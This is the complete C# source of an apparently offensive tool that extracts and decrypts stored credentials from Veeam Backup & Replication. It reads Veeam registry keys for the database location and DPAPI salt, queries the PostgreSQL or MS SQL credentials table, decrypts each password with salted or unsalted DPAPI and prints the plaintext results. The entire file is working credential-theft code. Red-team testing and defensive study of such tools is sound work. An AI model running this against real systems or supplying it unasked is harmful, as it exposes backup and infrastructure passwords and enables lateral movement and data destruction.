using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Npgsql;

class Program
{
    static void Main()
    {
        string banner = @"
   _____ __                   _    __                          ____                             __            
  / ___// /_  ____ __________| |  / /__  ___  ____ _____ ___  / __ \___  ____________  ______  / /_____  _____
  \__ \/ __ \/ __ `/ ___/ __ \ | / / _ \/ _ \/ __ `/ __ `__ \/ / / / _ \/ ___/ ___/ / / / __ \/ __/ __ \/ ___/
 ___/ / / / / /_/ / /  / /_/ / |/ /  __/  __/ /_/ / / / / / / /_/ /  __/ /__/ /  / /_/ / /_/ / /_/ /_/ / /    
/____/_/ /_/\__,_/_/  / .___/|___/\___/\___/\__,_/_/ /_/ /_/_____/\___/\___/_/   \__, / .___/\__/\____/_/     
                     /_/                                                        /____/_/                      

                                                                        Author: @ShitSecure ";

        Console.WriteLine(banner);

        // Check for v12+ configuration first
        string sqlActiveConfiguration = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations", "SqlActiveConfiguration");
        string salt = GetSalt();

        if (!string.IsNullOrEmpty(salt))
        {
            Console.WriteLine($"[+] Found encryption salt: {salt.Substring(0, Math.Min(20, salt.Length))}...");
        }
        else
        {
            Console.WriteLine("[!] No encryption salt found (old Veeam version or not configured)");
        }

        if (sqlActiveConfiguration == "PostgreSql")
        {
            Console.WriteLine("\r\n[*] Detected Veeam v12+ with PostgreSQL backend");
            ExtractPostgreSqlCredentials(salt);
        }
        else if (sqlActiveConfiguration == "MsSql")
        {
            Console.WriteLine("\r\n[*] Detected Veeam v12+ with MS SQL backend");
            ExtractMsSqlCredentialsV12(salt);
        }
        else
        {
            // Fallback to v11 detection
            Console.WriteLine("\r\n[*] Trying Veeam v11 MS SQL detection...");
            ExtractMsSqlCredentialsV11(salt);
        }
    }

    static void ExtractPostgreSqlCredentials(string salt)
    {
        string postgresUser = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\PostgreSQL", "PostgresUserForWindowsAuth");
        string sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\PostgreSQL", "SqlDatabaseName");
        string postgresLocation = GetRegistryValue(@"SOFTWARE\PostgreSQL Global Development Group\PostgreSQL", "Location");

        if (string.IsNullOrEmpty(postgresUser)) postgresUser = "postgres";
        if (string.IsNullOrEmpty(sqlDatabaseName)) sqlDatabaseName = "VeeamBackup";

        Console.WriteLine($"[*] PostgreSQL Database: {sqlDatabaseName}");
        Console.WriteLine($"[*] PostgreSQL User: {postgresUser}");
        Console.WriteLine($"[*] PostgreSQL Location: {postgresLocation}");

        // Connection string for Windows Authentication
        string connectionString = $"Host=localhost;Database={sqlDatabaseName};Username={postgresUser};Integrated Security=true;";

        // Try alternate connection string
        if (!TryConnectPostgres(connectionString))
        {
            connectionString = $"Host=localhost;Port=5432;Database={sqlDatabaseName};Username={postgresUser};";
            Console.WriteLine("[*] Trying alternate connection method...");
        }

        List<Tuple<string, string, string>> credentials = new List<Tuple<string, string, string>>();

        try
        {
            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();
                Console.WriteLine("[+] Connected to PostgreSQL database.");

                string sqlQuery = "SELECT user_name, password, description FROM public.credentials WHERE password != '' AND password IS NOT NULL";
                using (var command = new NpgsqlCommand(sqlQuery, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string userName = reader["user_name"]?.ToString() ?? "";
                            string encryptedPassword = reader["password"]?.ToString() ?? "";
                            string description = reader["description"]?.ToString() ?? "";
                            string decryptedPassword = DecryptPassword(encryptedPassword, salt);
                            credentials.Add(Tuple.Create(userName, decryptedPassword, description));
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error connecting to PostgreSQL: {ex.Message}");
            Console.WriteLine($"[-] Make sure you run as Administrator and PostgreSQL service is running");
            return;
        }

        PrintCredentials(credentials);
    }

    static bool TryConnectPostgres(string connectionString)
    {
        try
        {
            using (var connection = new NpgsqlConnection(connectionString))
            {
                connection.Open();
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    static void ExtractMsSqlCredentialsV12(string salt)
    {
        string sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql", "SqlDatabaseName");
        string sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql", "SqlInstanceName");
        string sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql", "SqlServerName");

        ExtractMsSqlCredentials(sqlDatabaseName, sqlInstanceName, sqlServerName, salt);
    }

    static void ExtractMsSqlCredentialsV11(string salt)
    {
        string sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlDatabaseName");
        string sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlInstanceName");
        string sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlServerName");

        if (sqlDatabaseName == null)
        {
            sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlDatabaseName");
            sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlInstanceName");
            sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlServerName");
        }

        ExtractMsSqlCredentials(sqlDatabaseName, sqlInstanceName, sqlServerName, salt);
    }

    static void ExtractMsSqlCredentials(string sqlDatabaseName, string sqlInstanceName, string sqlServerName, string salt)
    {
        Console.WriteLine($"\r\n[*] SqlDatabase: {sqlDatabaseName}");
        Console.WriteLine($"[*] SqlInstance: {sqlInstanceName}");
        Console.WriteLine($"[*] SqlServer: {sqlServerName}");

        if (sqlServerName == null)
        {
            Console.WriteLine("[-] Server not found, exit...");
            return;
        }

        string connectionString = $"Server={sqlServerName}\\{sqlInstanceName};Database={sqlDatabaseName};Integrated Security=True;TrustServerCertificate=True;";

        List<Tuple<string, string, string>> credentials = new List<Tuple<string, string, string>>();

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            try
            {
                connection.Open();
                Console.WriteLine("[+] Connected to the MS SQL database.");

                string sqlQuery = $"SELECT [user_name], [password], [description] FROM [{sqlDatabaseName}].[dbo].[Credentials] WHERE [password] <> ''";
                using (SqlCommand command = new SqlCommand(sqlQuery, connection))
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string userName = reader["user_name"]?.ToString() ?? "";
                            string encryptedPassword = reader["password"]?.ToString() ?? "";
                            string description = reader["description"]?.ToString() ?? "";
                            string decryptedPassword = DecryptPassword(encryptedPassword, salt);
                            credentials.Add(Tuple.Create(userName, decryptedPassword, description));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        PrintCredentials(credentials);
    }

    static string GetRegistryValue(string registryPath, string valueName)
    {
        try
        {
            // Try 64-bit view first
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)
                .OpenSubKey(registryPath))
            {
                if (key != null)
                {
                    object value = key.GetValue(valueName);
                    if (value != null)
                    {
                        // Handle different registry value types
                        if (value is string strValue)
                        {
                            return strValue.TrimEnd('\0'); // Remove null terminators
                        }
                        else if (value is byte[] byteValue)
                        {
                            return Encoding.Unicode.GetString(byteValue).TrimEnd('\0');
                        }
                        return value.ToString().TrimEnd('\0');
                    }
                }
            }

            // Fallback: Try 32-bit view
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32)
                .OpenSubKey(registryPath))
            {
                if (key != null)
                {
                    object value = key.GetValue(valueName);
                    if (value != null)
                    {
                        if (value is string strValue)
                        {
                            return strValue.TrimEnd('\0');
                        }
                        else if (value is byte[] byteValue)
                        {
                            return Encoding.Unicode.GetString(byteValue).TrimEnd('\0');
                        }
                        return value.ToString().TrimEnd('\0');
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error reading registry {registryPath}\\{valueName}: {ex.Message}");
        }
        return null;
    }
    static string GetSalt()
    {
        // Try v12+ location
        string salt = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication\Data", "EncryptionSalt");
        if (!string.IsNullOrEmpty(salt))
        {
            return salt;
        }

        // Try alternative location
        salt = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlSecuredPassword");
        return salt;
    }

    static string DecryptPassword(string encryptedPassword, string salt)
    {
        try
        {
            byte[] encryptedbytePassword = Convert.FromBase64String(encryptedPassword);

            // Try unsalted DPAPI first (old Veeam versions)
            try
            {
                byte[] decryptedData = ProtectedData.Unprotect(encryptedbytePassword, null, DataProtectionScope.LocalMachine);
                return Encoding.Default.GetString(decryptedData);
            }
            catch
            {
                // Try salted DPAPI (new Veeam v12+ versions)
                if (!string.IsNullOrEmpty(salt))
                {
                    try
                    {
                        byte[] saltBytes = Convert.FromBase64String(salt);

                        // Convert to hex string
                        StringBuilder hex = new StringBuilder(encryptedbytePassword.Length * 2);
                        foreach (byte b in encryptedbytePassword)
                        {
                            hex.AppendFormat("{0:x2}", b);
                        }

                        // Skip first 74 hex chars (37 bytes header)
                        string hexString = hex.ToString();
                        if (hexString.Length > 74)
                        {
                            hexString = hexString.Substring(74);

                            // Convert hex back to bytes
                            byte[] encryptedData = new byte[hexString.Length / 2];
                            for (int i = 0; i < hexString.Length; i += 2)
                            {
                                encryptedData[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
                            }

                            // Decrypt with salt
                            byte[] decryptedData = ProtectedData.Unprotect(encryptedData, saltBytes, DataProtectionScope.LocalMachine);
                            return Encoding.Default.GetString(decryptedData);
                        }
                    }
                    catch (Exception ex)
                    {
                        return $"[DECRYPT_FAILED: {ex.Message}]";
                    }
                }
                return "[NO_SALT_AVAILABLE]";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error decrypting password: {ex.Message}");
            return "[DECRYPTION_ERROR]";
        }
    }

    static void PrintCredentials(List<Tuple<string, string, string>> credentials)
    {
        if (credentials.Count == 0)
        {
            Console.WriteLine("\r\n[-] No credentials found!");
            return;
        }

        Console.WriteLine($"\r\n[+] Found {credentials.Count} credential(s):\r\n");
        Console.WriteLine($"{"User Name",-40} {"Password",-40} {"Description",-30}");
        Console.WriteLine(new string('-', 110));

        foreach (var credential in credentials)
        {
            Console.WriteLine($"{credential.Item1,-40} {credential.Item2,-40} {credential.Item3,-30}");
        }
    }
}
